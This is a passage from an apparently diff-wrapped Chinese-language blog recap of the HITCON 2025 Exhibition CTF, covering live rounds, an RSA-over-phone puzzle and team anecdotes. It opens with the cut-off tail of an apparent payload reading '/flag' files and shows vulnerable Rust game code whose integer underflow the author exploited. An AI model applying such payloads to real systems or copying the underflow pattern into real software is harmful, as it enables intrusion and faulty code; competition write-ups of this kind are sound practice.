/flag*&#x27;).toString()&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Live-CTF-eSports"><a href="#Live-CTF-eSports" class="headerlink" title="Live CTF (eSports)"></a>Live CTF (eSports)</h3><h4 id="Derby"><a href="#Derby" class="headerlink" title="Derby"></a>Derby</h4><p>首先是 Derby 這題，賽前看到這題目名稱的時候其實 @chilin 就有告訴我他覺得應該是 Android 題，然後就是一個賽馬娘遊戲<br>對的沒錯，但我們這些人才是馬娘 :&gt;  </p>
+<p>詳細可以看：<br><a target="_blank" rel="noopener" href="https://youtu.be/ENOqzvAJ1y4?t=12874">https://youtu.be/ENOqzvAJ1y4?t=12874</a><br>拆開來做一下逆向工程會發現都是從 native 裡面挖函數，然後追進去看就是每搖一下都會拿當前 server 的 challenge 當 nonce 做 PoW，簡言之就是類似區塊練上，不過是人肉挖礦 …<br>可以自動化，但在我寫完腳本前 @ShallowFeather 就已經出動氪金版 copilot 打玩了，這局被星爆搶走w<br><img src="https://hackmd.io/_uploads/S1HmrAHRxg.png" alt="image"></p>
+<h4 id="Baby-MAC"><a href="#Baby-MAC" class="headerlink" title="Baby MAC"></a>Baby MAC</h4><p>六隊一起上台，兩兩單挑打 mac baby pwn，不過因為我們現場四人都不是 MAC 用戶，緊急摳了飯店的隊友給我們開 REMOTE 連進去他的 MAC &#x3D; &#x3D;  </p>
+<p>然後本來被派上去的是我，開賽前主辦公布了這題是 pwn 然後問我們要不要換一下人，我很自然地下台換了 p23 上台，但裝置已經不能改了 qq<br>處理連線問題一陣子之後看起來 Everything is fine，就開始正式打題目了…嗎？<br><del>沒有，p23 用 terminal 在跟 Grissa 確認事情</del><br><a target="_blank" rel="noopener" href="https://youtu.be/hrKPKZACpAM?t=2200">https://youtu.be/hrKPKZACpAM?t=2200</a><br>聽說還有講一些更奇怪的話但我自己滑影片沒找到，或許好心人可以自己幫我 fallback 一下 XDDD<br>反正最後結果就是大家都 PWN 不下來除了 <code>B33F</code> 的 @pwn2ooown，所以跟他對打的 Blue Goblin 就被送下去了 qq  </p>
+<h4 id="Tower-Defense"><a href="#Tower-Defense" class="headerlink" title="Tower Defense"></a>Tower Defense</h4><p>直接附上直播畫面 簡言之就是一個類似貓戰的塔防遊戲，不過大家都是打對面的電腦<br>這當然換我上咯，web 題耶…嗎？<br><del>不，我一開始以為沒給 src 導致我在那邊分析流量打黑箱，一邊餵給 llm 幫我寫自動化腳本，結果有幾次還真的觸發到漏洞</del>  </p>
+<p><img src="https://hackmd.io/_uploads/B1vJ5ABCeg.png" alt="image"></p>
+<p><a target="_blank" rel="noopener" href="https://youtu.be/hrKPKZACpAM?t=7094">https://youtu.be/hrKPKZACpAM?t=7094</a><br>結果就促成了大家不是在玩遊戲就是在看 src 的有趣場面，只有我一個在拆流量和看前端 js 去建立所有 api call 的表<br>後來看到 hint 說 game.rs 有漏洞我才驚覺不對勁去翻了一下 XDDD 看到 handout 就躺在那邊，不過那時候我分數依然是第一名有點酷<br>於是在看到是 rust 後…痾…不會 rust 的我馬上再餵給 llm 一次，他丟幾個 bug type 出來後我 review 了一下馬上就看到 interger underflow，改一下腳本針對 underflow 去攻擊就結束惹！  </p>
+<p>注意到 money 都是 u64，又有卡片的 discard cost 是負的  </p>
+<figure class="highlight rs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PlayerAction::<span class="title function_ invoke__">DiscardCard</span>(idx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">slot</span> = player_state.hand.<span class="title function_ invoke__">get_mut</span>(idx)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">Some</span>(card) = slot <span class="keyword">else</span> &#123;</span><br><span class="line">        notifications.<span class="title function_ invoke__">push</span>(Notification &#123;</span><br><span class="line">            message: <span class="built_in">format!</span>(<span class="string">&quot;no card at index &#123;&#125;&quot;</span>, idx),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> player_state.money &lt; card.discard_cost &#123;</span><br><span class="line">        notifications.<span class="title function_ invoke__">push</span>(Notification &#123;</span><br><span class="line">            message: <span class="string">&quot;not enough money&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    player_state.money -= card.discard_cost;</span><br><span class="line">    *slot = <span class="literal">None</span>;</span><br><span class="line">    <span class="literal">None</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反正那天結束後這場我們是冠軍，明天跟竹狐廝殺 &#x3D; &#x3D;  </p>
+<h2 id="Day-1-Day-2"><a href="#Day-1-Day-2" class="headerlink" title="Day 1 ~ Day 2"></a>Day 1 ~ Day 2</h2><p>那時候大概晚上九點的時候我上床躺了一下，大概十點半的時候突然被挖起來：<br>@chilin 和幾個人人 @lemontea @legendyang 之類的：欸鯨魚，算數學<br>我腦中閃過的 “LLL”, “奇奇怪怪的 Curve”, “Quantum”… 而且一定不基本不然隊上也有人 Crypto 不錯啊<br>結果只是 RSA ????，keysize 甚至 12 bits 而已<br><del>喔不但這個 RSA 我打到快 12 點才解開</del>  </p>
+<p>講一下發生了什麼，Blue Goblin 有個題目一開始是一個 web，做完 sqli 後拿到一堆帳密然後就不知道幹嘛惹  </p>
+<p><img src="https://hackmd.io/_uploads/ByYFly8Cle.png" alt="image"><br>大概過了快半天：  </p>
+<p><img src="https://hackmd.io/_uploads/HJZjx1UAxx.png" alt="image">  </p>
+<p>喔喔喔喔喔原來在 SRV 的 DNS Record ???  </p>
+<p>然後有個 SIP 協議，其實就是早期在 VoIP(網路電話) 還沒出來前的無限電話協議，打過去之後就開始聽一堆語音，反正最後大概就像是這樣，其中 sqli 出來的那個 4815 是分機號碼我真是謝了（其實又好合理？）  </p>
+<p><img src="https://hackmd.io/_uploads/H1rXb1URle.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/ryFnZ1ICxg.png" alt="image">  </p>
+<p>ok 反正就是語音告訴我有五個段落，第一個段落是公鑰<br>我就在想 蝦，公鑰三個數字？？<br>好巧不巧，3233 + 2790 也是兩個質數相乘，我就在那邊通靈了一個小時  </p>
+<p>最後，聽到都對電話撥出聲音有 PTSD 的我發現 2790 是秘文 (3233, 17) 是 (n, e)，傳解密後的數字用電話按鈕送回去就好 …<br><del>賽後互評我沒記錯的話我們這組給最低分的是這題，氣死</del>  </p>
+<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>轉眼間就來到 Day2，前一天上場的本來是我、chilin、zk、p23<br>到今天因為有兩個去金盾的就變成我、p23、Frank 了  </p>
+<p>這一天就比較沒特別做什麼事情，大概寫一下 Live CTF 發生了什麼好了  </p>
+<h3 id="Live-CTF-eSports-1"><a href="#Live-CTF-eSports-1" class="headerlink" title="Live CTF (eSports)"></a>Live CTF (eSports)</h3><p>這次一樣是塔防，我對的是竹狐的 @ianiiaannn，七戰四勝<br>然後昨天的漏洞被 patch 了 qq，前兩回合我們全程用手按著玩，我有掏出自動化腳本<br><del>但不論是哪一種我都被壓在地上虐，到底要怎麼在塔防遊戲打贏貓戰元老玩家</del><br>HITCON 就喊停了一下讓我們先 code review，後面三回合我（<del>和我最棒的夥伴 - Claude</del>）先找到了魔法卡在發動的時候的 Race Condition，腳本 gogo 然後就連壓了三局  </p>
+<p>Btw 那時候導播在講的時候就說：我們 ICEDTEA 的選手現在正 … 那 Race Condition 是一個 … 的漏洞<br>我：[打開 Note Pad，打下(類似的話) 哈囉導播，這樣是不是 leak 了選手資訊]， (因為那時候他們就在我們旁邊講)  </p>
+<p>反正他們後來好像就換話題了<br>結果<br>結果…<br>@ianiiaannn 後來也看到了同一個漏洞，因為是一秒一秒算的其實 race window 有點大，他就直接給我手按喔<br><strong>手按欸</strong><br>用手按打贏了我這個寫腳本的選手<br>&#x3D; &#x3D;|||<br><del>這把輸在不會玩貓戰</del>  </p>
+<h3 id="賽後分享"><a href="#賽後分享" class="headerlink" title="賽後分享"></a>賽後分享</h3><p>各隊報告差不多就是那樣，然後請了 @orange @angelboy @lays 台灣三個 CTF 元老級之神當評審聽大家分享<br>然後一開始在介紹各隊伍的時候，簡報一頁一頁切<br><del>還直接漏看然後跳過 ICEDTEA，全場譁然，於是我弱弱的舉手 … 那個 … 好像跳過了</del><br>欸不是<br><strong>不是欸！</strong><br>真的沒有這樣的啦 &#x3D; &#x3D;|||<br>這次比賽出現的幾個(不算小的) Drama 之一 XD  </p>
+<h3 id="After-Party"><a href="#After-Party" class="headerlink" title="After Party"></a>After Party</h3><p>吃吃喝喝 簡單帶過因為我有點不知道還有什麼要寫了 XD  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>來點抽象，你永遠不知道隊友在你睡著後做了什麼怪事（簾子裡面是我）  </p>
+<p><img src="https://hackmd.io/_uploads/BkBKnaSCxx.png" alt="image"></p>
+<p>喜歡隊伍上的歡快，很像是一個大家庭的氛圍 XDD<br>也很開心自己高中時隨手創立的隊伍能慢慢收留一些熱愛這個領域的學生，畢竟其實也跟蠻多人聊過，真的就是…很投入的情況下跟班上&#x2F;身邊的人其實會慢慢找不到話題、脫節、不被理解，這時候真的會很需要一群同伴  </p>
+<p>繼續一起努力一起加油吧 &lt;3  </p>
+<p><img src="https://hackmd.io/_uploads/BJ7cv-LRel.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">2.</span> <span class="toc-text">Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Belluminar-Challenge-prepare"><span class="toc-number">2.1.</span> <span class="toc-text">Belluminar - Challenge prepare</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-0"><span class="toc-number">3.</span> <span class="toc-text">Day 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">4.</span> <span class="toc-text">Day 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jeopardy"><span class="toc-number">4.1.</span> <span class="toc-text">Jeopardy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Live-CTF-eSports"><span class="toc-number">4.2.</span> <span class="toc-text">Live CTF (eSports)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Derby"><span class="toc-number">4.2.1.</span> <span class="toc-text">Derby</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Baby-MAC"><span class="toc-number">4.2.2.</span> <span class="toc-text">Baby MAC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tower-Defense"><span class="toc-number">4.2.3.</span> <span class="toc-text">Tower Defense</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1-Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 1 ~ Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">6.</span> <span class="toc-text">Day 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Live-CTF-eSports-1"><span class="toc-number">6.1.</span> <span class="toc-text">Live CTF (eSports)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B3%BD%E5%BE%8C%E5%88%86%E4%BA%AB"><span class="toc-number">6.2.</span> <span class="toc-text">賽後分享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#After-Party"><span class="toc-number">6.3.</span> <span class="toc-text">After Party</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">7.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/10/22/hitcon-final-2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&text=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&is_video=false&description=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HITCON 2025 Exhibition CTF 隨筆&body=Check out this article: http://wha13.github.io/2025/10/22/hitcon-final-2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&title=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/10/22/hitcon-final-2025/&name=HITCON 2025 Exhibition CTF 隨筆&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/10/22/hitcon-final-2025/&t=HITCON 2025 Exhibition CTF 隨筆"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
